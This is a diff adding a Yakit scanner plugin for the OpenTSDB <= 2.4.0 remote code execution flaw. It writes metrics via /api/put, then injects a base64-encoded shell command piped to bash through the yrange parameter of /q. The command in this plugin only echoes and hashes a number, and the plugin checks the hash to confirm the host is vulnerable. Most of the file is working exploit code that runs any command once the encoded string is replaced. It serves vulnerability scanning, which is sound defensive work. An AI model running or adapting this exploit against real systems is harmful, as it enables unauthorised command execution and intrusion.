@@ -1,0 +1,109 @@
+yakit.AutoInitYakit()
+
+handleCheck = func(target,port){
+    var url
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+    level=["","low","middle","high","critical"]
+    if isTls {
+        url="https://"+addr
+    }else{
+        url="http://"+addr
+    }
+    vulnable=false
+
+    reference="OpenTSDB <= 2.4.0 远程代码执行漏洞"
+    severity="critical"
+    type="漏洞"
+    r4 = randn(1024,65535)
+    r3 = str.RandStr(3)
+    r2 = str.RandStr(3)
+    r1 = str.RandStr(3)
+
+    poc_url_r0= url + `/s/opentsdb_header.jpg`
+    req_r0, _ := http.NewRequest("GET",poc_url_r0,http.noredirect(),
+    http.header("Content-Type", `application/x-www-form-urlencoded`),)
+    breq,_=http.dump(req_r0)
+    resp_r0, err := http.Do(req_r0)
+    die(err)
+    bresp,_=http.dump(resp_r0)
+    header, body = poc.Split(bresp)
+    r0_flag = false
+    if resp_r0.StatusCode == 200 && str.Contains(string(header),"text/plain") && str.Contains(string(body),"\xff\xd8\xff\xe1"){
+        r0_flag = true
+    }
+
+    poc_url_r1= url + `/api/put`
+    req_r1, _ := http.NewRequest("POST",poc_url_r1,http.noredirect(),
+    http.header("Content-Type", `application/x-www-form-urlencoded`),
+    http.body(`[
+    {
+        "metric": "`+ parseStr(r1) +`.`+ parseStr(r2) +`.`+ parseStr(r3) +`",
+        "timestamp": 1608700420,
+        "value": `+ parseStr(r4) +`,
+        "tags": {
+           "host": "web01",
+           "dc": "lga"
+        }
+    },
+    {
+        "metric": "`+ parseStr(r1) +`.`+ parseStr(r2) +`.`+ parseStr(r3) +`",
+        "timestamp": 1608700421,
+        "value": `+ parseStr(r4) +`,
+        "tags": {
+           "host": "web02",
+           "dc": "lga"
+        }
+    }
+]`),)
+    breq,_=http.dump(req_r1)
+    resp_r1, err := http.Do(req_r1)
+    die(err)
+    bresp,_=http.dump(resp_r1)
+    header, body = poc.Split(bresp)
+    r1_flag = false
+    if sleep(5) && resp_r1.StatusCode == 204 && str.Contains(string(header),"json"){
+        r1_flag = true
+    }
+
+    poc_url_r2= url + `/q?start=2000/10/21-00:00:00&end=2020/12/25-00:00:00&m=sum:`+ parseStr(r1) +`.`+ parseStr(r2) +`.`+ parseStr(r3) +`&o=&yrange=[0:system('echo%20-e%20"ZWNobyAxMjMgfG1kNXN1bSAxPiYyCg=="%20|%20base64%20-d%20|bash')]&wxh=1698x316&style=linespoint&json`
+    req_r2, _ := http.NewRequest("GET",poc_url_r2,http.noredirect(),
+    http.header("Content-Type", `application/x-www-form-urlencoded`),)
+    breq,_=http.dump(req_r2)
+    resp_r2, err := http.Do(req_r2)
+    die(err)
+    bresp,_=http.dump(resp_r2)
+    header, body = poc.Split(bresp)
+    r2_flag = false
+    if resp_r2.StatusCode == 400 && str.Contains(string(header),"json") && re.Match(`ba1f2511fc30423bdbb183fe33f3dd0f`,string(body)){
+        r2_flag = true
+    }
+
+    poc_url=poc_url_r2
+    if r0_flag && r1_flag && r2_flag{
+        vulnable = true
+    }
+    if vulnable {
+            yakit.Info("FOUND INFO for %v %v",reference,type)
+            risk.NewRisk(
+                url, risk.severity(severity), 
+                risk.title(sprintf("FOUND %v %v",reference,type)),
+                risk.titleVerbose(sprintf("%v %v",reference,type)),
+                risk.type(type), risk.typeVerbose(type),
+                risk.details({
+                    "request": breq,
+                    "response": bresp,
+                    "url": poc_url,
+                }),
+            )
+        }
+    return
+}
+handle = func(result) {
+    if !result.IsOpen(){
+        return
+    }
+    if len(result.Fingerprint.HttpFlows)>0{
+        handleCheck(result.Target,result.Port)
+    }
+}
